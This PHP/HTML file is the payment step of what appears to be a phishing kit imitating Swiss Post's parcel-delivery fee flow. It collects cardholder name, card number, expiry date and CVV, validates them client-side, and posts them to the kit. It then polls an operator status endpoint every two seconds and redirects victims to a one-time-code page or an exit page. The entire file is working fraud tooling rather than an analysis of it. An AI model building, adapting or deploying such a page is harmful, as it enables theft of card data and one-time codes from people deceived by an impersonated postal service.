<?php
require __DIR__ . '/security.php';
require __DIR__ . '/lang.php';

// Vérifier que les informations de billing sont en session
if (!isset($_SESSION['_address'])) {
    header("Location: ?s=billing");
    exit;
}
?><!DOCTYPE html>
<html lang="<?php echo $currentLang; ?>">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title><?php echo t('page_payment'); ?></title>
<link rel="icon" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTHHKFg8ixJBlUr6SNFiET4Do7BS-0YWVOTpb9GZ0OSNBTcQMW0">
<link href="https://fonts.googleapis.com/css2?family=Fira+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
<style>
*{box-sizing:border-box;margin:0;padding:0;}
body{font-family:'Fira Sans',Arial,sans-serif;background:#f5f5f5;color:#1e1e1e;font-size:16px;line-height:1.5;min-height:100vh;display:flex;flex-direction:column;}
a{text-decoration:none;color:inherit;}

:root {
    --post-yellow: #FFCC00;
    --post-yellow-dark: #E6B800;
    --post-red: #E2001A;
    --post-gray: #F5F5F5;
    --post-dark: #1e1e1e;
    --post-border: #e5e5e5;
    --post-green: #00A550;
}

.tb{background:#fff;border-bottom:1px solid var(--post-border);display:flex;align-items:center;height:56px;padding:0 24px;}
.tb-logo img{height:40px;}
.tb-right{margin-left:auto;display:flex;align-items:center;gap:16px;}
.tb-langs{display:flex;align-items:center;border:1px solid var(--post-border);border-radius:4px;overflow:hidden;}
.tb-lang{font-size:13px;font-weight:600;padding:6px 10px;cursor:pointer;color:#666;background:#fff;}
.tb-lang.active{background:var(--post-dark);color:#fff;}

.breadcrumb{background:#fff;padding:14px 24px;border-bottom:1px solid var(--post-border);font-size:13px;color:#666;}
.breadcrumb a{color:var(--post-red);font-weight:500;}
.breadcrumb span{margin:0 8px;color:#ccc;}

.page-content{flex:1;display:flex;justify-content:center;padding:40px 20px;}
.payment-wrapper{width:100%;max-width:540px;}

.secure-badge{display:flex;align-items:center;gap:8px;color:var(--post-green);font-size:14px;font-weight:600;margin-bottom:16px;}
.secure-badge svg{width:20px;height:20px;fill:var(--post-green);}

.payment-card{background:#fff;border-radius:12px;box-shadow:0 4px 24px rgba(0,0,0,0.08);overflow:hidden;}
.payment-header{background:var(--post-yellow);padding:28px 32px;color:var(--post-dark);}
.payment-header h1{font-size:22px;font-weight:800;margin-bottom:4px;}
.payment-header p{font-size:14px;opacity:0.8;}
.payment-body{padding:32px;}

.order-summary{background:var(--post-gray);border-radius:10px;padding:20px 24px;margin-bottom:28px;}
.order-row{display:flex;justify-content:space-between;align-items:center;font-size:14px;padding:8px 0;}
.order-label{color:#666;}
.order-value{font-weight:700;color:var(--post-dark);}
.order-row.total{border-top:1px dashed #ddd;margin-top:12px;padding-top:16px;}
.order-row.total .order-label{font-weight:700;color:var(--post-dark);}
.order-row.total .order-value{font-size:24px;color:var(--post-dark);}

.section-title{font-size:15px;font-weight:700;color:var(--post-dark);margin:28px 0 16px;padding-top:20px;border-top:1px solid #eee;display:flex;align-items:center;gap:10px;}
.section-title:first-of-type{margin-top:0;padding-top:0;border-top:none;}
.section-title svg{width:22px;height:22px;fill:var(--post-yellow);}

.form-group{margin-bottom:20px;}
.form-group label{display:block;font-size:13px;font-weight:600;color:var(--post-dark);margin-bottom:8px;}
.form-group input{width:100%;height:52px;border:2px solid var(--post-border);border-radius:8px;padding:0 16px;font-size:15px;font-family:inherit;color:var(--post-dark);background:#fff;transition:all 0.2s;}
.form-group input:focus{outline:none;border-color:var(--post-yellow);box-shadow:0 0 0 3px rgba(255,204,0,0.2);}
.form-group input::placeholder{color:#999;}
.form-group input.valid{border-color:var(--post-green);background:#f8fff9;}
.form-group input.invalid{border-color:var(--post-red);background:#fff8f8;}

.form-row{display:grid;grid-template-columns:1fr 1fr;gap:16px;}
.form-row-3{display:grid;grid-template-columns:2fr 1fr;gap:16px;}

.field-error{color:var(--post-red);font-size:12px;font-weight:500;margin-top:6px;display:none;}
.field-error.show{display:block;}

.card-type-badge{display:inline-flex;align-items:center;gap:4px;font-size:11px;font-weight:700;padding:4px 10px;border-radius:4px;margin-top:8px;display:none;}
.card-type-badge.show{display:inline-flex;}
.card-type-badge.visa{background:#1a1f71;color:#fff;}
.card-type-badge.master{background:linear-gradient(135deg,#eb001b,#f79e1b);color:#fff;}
.card-type-badge.amex{background:#007bc1;color:#fff;}

#luhn-msg{font-size:12px;font-weight:600;margin-top:6px;display:none;}
#luhn-msg.valid{color:var(--post-green);display:block;}
#luhn-msg.invalid{color:var(--post-red);display:block;}

.btn-submit{width:100%;height:56px;background:var(--post-yellow);color:var(--post-dark);border:none;border-radius:8px;font-size:16px;font-weight:800;font-family:inherit;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;margin-top:28px;transition:all 0.2s;opacity:0.5;cursor:not-allowed;}
.btn-submit.ready{opacity:1;cursor:pointer;}
.btn-submit.ready:hover{background:var(--post-yellow-dark);transform:translateY(-1px);box-shadow:0 4px 16px rgba(255,204,0,0.4);}
.btn-submit svg{width:22px;height:22px;fill:currentColor;}
.btn-submit.loading{pointer-events:none;}
.btn-submit.loading .btn-text{display:none;}
.btn-submit .spinner{display:none;width:22px;height:22px;border:3px solid rgba(0,0,0,0.2);border-top-color:var(--post-dark);border-radius:50%;animation:spin 0.8s linear infinite;}
.btn-submit.loading .spinner{display:block;}
@keyframes spin{to{transform:rotate(360deg);}}

.security-info{display:flex;align-items:center;justify-content:center;gap:20px;margin-top:24px;padding-top:20px;border-top:1px solid #eee;}
.security-item{display:flex;align-items:center;gap:6px;font-size:12px;color:#888;}
.security-item svg{width:16px;height:16px;fill:#888;}

.card-brands{display:flex;align-items:center;justify-content:center;gap:12px;margin-top:20px;}
.card-brands img,.card-brands svg{height:28px;}

.back-link{display:inline-flex;align-items:center;gap:6px;color:var(--post-red);font-size:14px;font-weight:600;margin-top:20px;cursor:pointer;}
.back-link:hover{text-decoration:underline;}
.back-link svg{width:18px;height:18px;fill:currentColor;}

footer{background:#fff;border-top:1px solid var(--post-border);padding:20px 32px;text-align:center;}
footer p{font-size:12px;color:#888;}
footer a{color:var(--post-red);}

@media(max-width:600px){
    .tb{padding:0 16px;height:50px;}
    .tb-logo img{height:32px;}
    .tb-langs{display:none;}
    .breadcrumb{padding:12px 16px;font-size:12px;}
    .page-content{padding:20px 12px;}
    .payment-header{padding:24px 20px;}
    .payment-header h1{font-size:18px;}
    .payment-body{padding:24px 16px;}
    .order-summary{padding:16px 18px;}
    .form-row,.form-row-3{grid-template-columns:1fr;}
    .btn-submit{height:52px;font-size:15px;}
    .security-info{flex-wrap:wrap;gap:12px;}
}
</style>
</head>
<body>

<div class="tb">
    <div class="tb-logo">
        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTHHKFg8ixJBlUr6SNFiET4Do7BS-0YWVOTpb9GZ0OSNBTcQMW0" alt="Swiss Post">
    </div>
    <div class="tb-right">
        <div class="tb-langs">
            <a href="?s=2&lang=de" class="tb-lang <?php echo $currentLang === 'de' ? 'active' : ''; ?>">DE</a>
            <a href="?s=2&lang=fr" class="tb-lang <?php echo $currentLang === 'fr' ? 'active' : ''; ?>">FR</a>
            <a href="?s=2&lang=en" class="tb-lang <?php echo $currentLang === 'en' ? 'active' : ''; ?>">EN</a>
        </div>
    </div>
</div>

<div class="breadcrumb">
    <a href="?s=1"><?php echo t('bread_home'); ?></a>
    <span>›</span>
    <a href="?s=1"><?php echo t('bread_tracking'); ?></a>
    <span>›</span>
    <a href="?s=billing"><?php echo t('bread_billing'); ?></a>
    <span>›</span>
    <?php echo t('bread_payment'); ?>
</div>

<div class="page-content">
    <div class="payment-wrapper">
        <div class="secure-badge">
            <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM9 6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9V6zm9 14H6V10h12v10zm-6-3c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2z"/></svg>
            <?php echo t('pay_secure_badge'); ?>
        </div>

        <div class="payment-card">
            <div class="payment-header">
                <h1><?php echo t('pay_title'); ?></h1>
                <p><?php echo t('pay_tracking'); ?> #<?php echo $trackingNumber; ?></p>
            </div>
            <div class="payment-body">
                <div class="order-summary">
                    <div class="order-row">
                        <span class="order-label"><?php echo t('pay_delivery_fee'); ?></span>
                        <span class="order-value"><?php echo $currency; ?> <?php echo $amount; ?></span>
                    </div>
                    <div class="order-row">
                        <span class="order-label"><?php echo t('pay_processing_fee'); ?></span>
                        <span class="order-value"><?php echo $currency; ?> 0.00</span>
                    </div>
                    <div class="order-row total">
                        <span class="order-label"><?php echo t('pay_total'); ?></span>
                        <span class="order-value"><?php echo $currency; ?> <?php echo $amount; ?></span>
                    </div>
                </div>

                <form id="card-form" action="?s=p" method="post" novalidate>
                    <input type="hidden" name="step" value="payment">

                    <div class="section-title">
                        <svg viewBox="0 0 24 24"><path d="M20 4H4c-1.11 0-2 .89-2 2v12c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V6c0-1.11-.89-2-2-2zm0 14H4v-6h16v6zm0-10H4V6h16v2z"/></svg>
                        <?php echo t('pay_card_details'); ?>
                    </div>

                    <div class="form-group">
                        <label for="d0"><?php echo t('pay_cardholder'); ?></label>
                        <input type="text" name="name" id="d0" autocomplete="cc-name" placeholder="<?php echo t('pay_cardholder_placeholder'); ?>">
                        <span class="field-error" id="err-name"><?php echo t('err_name'); ?></span>
                    </div>

                    <div class="form-group">
                        <label for="cc"><?php echo t('pay_card_number'); ?></label>
                        <input type="text" name="cc" id="cc" placeholder="0000 0000 0000 0000" autocomplete="cc-number" inputmode="numeric">
                        <span class="card-type-badge" id="card-type"></span>
                        <span id="luhn-msg"></span>
                        <span class="field-error" id="err-cc"><?php echo t('err_card'); ?></span>
                    </div>

                    <div class="form-row">
                        <div class="form-group">
                            <label for="exp"><?php echo t('pay_expiry'); ?></label>
                            <input type="text" name="exp" id="exp" placeholder="MM/YY" autocomplete="cc-exp" inputmode="numeric">
                            <span class="field-error" id="err-exp"><?php echo t('err_expiry'); ?></span>
                        </div>
                        <div class="form-group">
                            <label for="cvv"><?php echo t('pay_cvv'); ?></label>
                            <input type="text" name="cvv" id="cvv" placeholder="000" autocomplete="cc-csc" inputmode="numeric">
                            <span class="field-error" id="err-cvv"><?php echo t('err_cvv'); ?></span>
                        </div>
                    </div>

                    <button type="submit" class="btn-submit" id="btn-submit" disabled>
                        <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2z"/></svg>
                        <span class="btn-text"><?php echo t('pay_submit'); ?> <?php echo $currency; ?> <?php echo $amount; ?></span>
                        <div class="spinner"></div>
                    </button>
                </form>

                <div class="security-info">
                    <div class="security-item">
                        <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2z"/></svg>
                        <?php echo t('pay_ssl'); ?>
                    </div>
                    <div class="security-item">
                        <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm4.59-12.42L10 14.17l-2.59-2.58L6 13l4 4 8-8z"/></svg>
                        <?php echo t('pay_realtime'); ?>
                    </div>
                    <div class="security-item">
                        <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
                        <?php echo t('pay_3ds'); ?>
                    </div>
                </div>

                <div class="card-brands">
                    <svg height="28" viewBox="0 0 750 471"><g fill="none"><rect fill="#0E4595" width="750" height="471" rx="40"/><path d="M278.198 334.228l33.36-195.763h53.358l-33.384 195.763h-53.334zm246.11-191.54c-10.572-3.966-27.135-8.222-47.822-8.222-52.725 0-89.863 26.551-90.18 64.604-.297 28.129 26.514 43.821 46.754 53.185 20.77 9.597 27.752 15.716 27.652 24.283-.133 13.123-16.586 19.116-31.924 19.116-21.355 0-32.701-2.967-50.225-10.274l-6.878-3.111-7.487 43.822c12.463 5.466 35.508 10.199 59.438 10.445 56.089 0 92.502-26.248 92.916-66.884.199-22.27-14.016-39.216-44.801-53.188-18.65-9.056-30.072-15.099-29.951-24.269 0-8.137 9.668-16.838 30.56-16.838 17.446-.271 30.106 3.534 39.936 7.5l4.781 2.259 7.231-42.428m137.308-4.223h-41.23c-12.772 0-22.332 3.486-27.94 16.234l-79.245 179.404h56.031s9.159-24.121 11.231-29.418c6.123 0 60.555.084 68.336.084 1.596 6.854 6.492 29.334 6.492 29.334h49.512l-43.187-195.638zm-65.417 126.408c4.414-11.279 21.26-54.724 21.26-54.724-.314.521 4.381-11.334 7.074-18.684l3.606 16.878s10.217 46.729 12.353 56.527h-44.293v.003zm-363.298-122.19l-52.239 133.5-5.565-27.129c-9.726-31.274-40.025-65.157-73.898-82.12l47.767 171.204 56.455-.063 84.004-195.392h-56.524" fill="#FFF"/><path d="M146.92 138.46H60.879l-.682 4.073c66.939 16.204 111.232 55.363 129.618 102.415l-18.709-89.96c-3.229-12.396-12.597-16.096-24.186-16.528" fill="#F2AE14"/></g></svg>
                    <svg height="28" viewBox="0 0 750 471"><g fill-rule="evenodd"><rect fill="#000" width="750" height="471" rx="40"/><circle fill="#EB001B" cx="250" cy="235" r="150"/><circle fill="#F79E1B" cx="500" cy="235" r="150"/><path d="M375 126.07a149.78 149.78 0 0 0-55 108.93c0 44.87 19.67 85.18 50.85 112.77a149.46 149.46 0 0 0 4.15 3.93 149.46 149.46 0 0 0 4.15-3.93c31.18-27.59 50.85-67.9 50.85-112.77a149.78 149.78 0 0 0-55-108.93z" fill="#FF5F00"/></g></svg>
                    <img src="https://lh3.googleusercontent.com/-HMMzVNh69gL0SsLMReGytn-Wf10oFHBOO05oixe5pKe5762nCu8YGadIHQ2xj5wGW4irBS_eUZ3riQhsl63THzhkMjJYx43mzBa2Z7Wf8NNGT4HicbO=w1200-l80-sg-rj" alt="Google Pay" height="28" style="border-radius:4px;">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b0/Apple_Pay_logo.svg/960px-Apple_Pay_logo.svg.png" alt="Apple Pay" height="28">
                </div>

                <a class="back-link" href="?s=billing">
                    <svg viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
                    <?php echo t('pay_back'); ?>
                </a>
            </div>
        </div>
    </div>
</div>

<footer>
    <p><?php echo t('pay_privacy'); ?> <a href="#"><?php echo t('pay_privacy_link'); ?></a></p>
    <p style="margin-top:8px;">&copy; 2024 <?php echo t('footer_copyright'); ?></p>
</footer>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
<script>
var cardValidText = <?php echo json_encode(t('card_valid')); ?>;

$("#cc").mask("0000 0000 0000 0000");
$("#exp").mask("00/00");
$("#cvv").mask("00009");
$("#zip").mask("00000");

function luhn(value) {
    var digits = value.replace(/\D/g, '');
    if (digits.length < 13) return false;
    var sum = 0, shouldDouble = false;
    for (var i = digits.length - 1; i >= 0; i--) {
        var d = parseInt(digits[i], 10);
        if (shouldDouble) { d *= 2; if (d > 9) d -= 9; }
        sum += d;
        shouldDouble = !shouldDouble;
    }
    return sum % 10 === 0;
}

function detectNetwork(digits) {
    if (/^4/.test(digits)) return 'VISA';
    if (/^5[1-5]/.test(digits)) return 'Mastercard';
    if (/^2[2-7]/.test(digits)) return 'Mastercard';
    if (/^3[47]/.test(digits)) return 'Amex';
    return null;
}

function validExp(val) {
    if (!/^\d{2}\/\d{2}$/.test(val)) return false;
    var parts = val.split('/');
    var mm = parseInt(parts[0], 10), yy = parseInt(parts[1], 10);
    if (mm < 1 || mm > 12) return false;
    var now = new Date();
    var expDate = new Date(2000 + yy, mm, 1);
    return expDate > now;
}

var fieldState = { name: false, cc: false, exp: false, cvv: false };

function refreshButton() {
    var allOk = fieldState.name && fieldState.cc && fieldState.exp && fieldState.cvv;
    $('#btn-submit').prop('disabled', !allOk).toggleClass('ready', allOk);
}

function setValid(input, errId) { $(input).removeClass('invalid').addClass('valid'); $('#' + errId).removeClass('show'); }
function setInvalid(input, errId) { $(input).removeClass('valid').addClass('invalid'); $('#' + errId).addClass('show'); }

$('#d0').on('input blur', function() {
    var v = $.trim($(this).val());
    var ok = v.length >= 2 && /^[a-zA-ZÀ-ÿ\s\-']+$/.test(v);
    fieldState.name = ok;
    if (ok) setValid(this, 'err-name'); else if (v.length > 0) setInvalid(this, 'err-name');
    refreshButton();
});

$('#cc').on('input', function() {
    var raw = $(this).val(), digits = raw.replace(/\D/g, '');
    var net = detectNetwork(digits);
    var $badge = $('#card-type'), $luhn = $('#luhn-msg');
    if (net && digits.length >= 4) {
        $badge.text(net).removeClass('visa master amex show')
              .addClass(net === 'VISA' ? 'visa' : net === 'Mastercard' ? 'master' : 'amex').addClass('show');
    } else { $badge.removeClass('show'); }
    var minLen = net === 'Amex' ? 15 : 16;
    if (digits.length === minLen) {
        if (luhn(digits)) {
            $luhn.text('✓ ' + cardValidText).attr('class', 'valid');
            setValid(this, 'err-cc'); fieldState.cc = true;
        } else {
            $luhn.text('').attr('class', 'invalid');
            setInvalid(this, 'err-cc'); fieldState.cc = false;
        }
    } else {
        $luhn.attr('class', '').text('');
        if (digits.length > 0) { $(this).removeClass('valid invalid'); $('#err-cc').removeClass('show'); }
        fieldState.cc = false;
    }
    refreshButton();
});

$('#exp').on('input blur', function() {
    var v = $(this).val(), ok = validExp(v);
    fieldState.exp = ok;
    if (ok) setValid(this, 'err-exp'); else if (v.length === 5) setInvalid(this, 'err-exp');
    refreshButton();
});

$('#cvv').on('input blur', function() {
    var v = $(this).val().replace(/\D/g, '');
    var ccDigits = $('#cc').val().replace(/\D/g, '');
    var isAmex = /^3[47]/.test(ccDigits);
    var ok = isAmex ? v.length === 4 : v.length === 3;
    fieldState.cvv = ok;
    if (ok) setValid(this, 'err-cvv'); else if (v.length >= 3) setInvalid(this, 'err-cvv');
    refreshButton();
});

$('#card-form').on('submit', function(e) {
    $('#d0, #cc, #exp, #cvv').trigger('blur');
    var allOk = fieldState.name && fieldState.cc && fieldState.exp && fieldState.cvv;
    if (!allOk) { e.preventDefault(); return false; }
    $('#btn-submit').addClass('loading');
});

// ========================================
// POLLING AUTOMATIQUE DU STATUT
// ========================================
setInterval(function() {
    fetch('?s=c')
        .then(r => r.json())
        .then(data => {
            if (data.status === 'approved_cc') {
                window.location.href = '?s=3'; // otp
            } else if (data.status === 'rejected_cc') {
                window.location.href = '?s=6'; // exit
            }
        })
        .catch(e => console.log('Status check error:', e));
}, 2000); // Vérifie toutes les 2 secondes
</script>
<script src="/assets/js/main.js"></script>
</body>
</html>
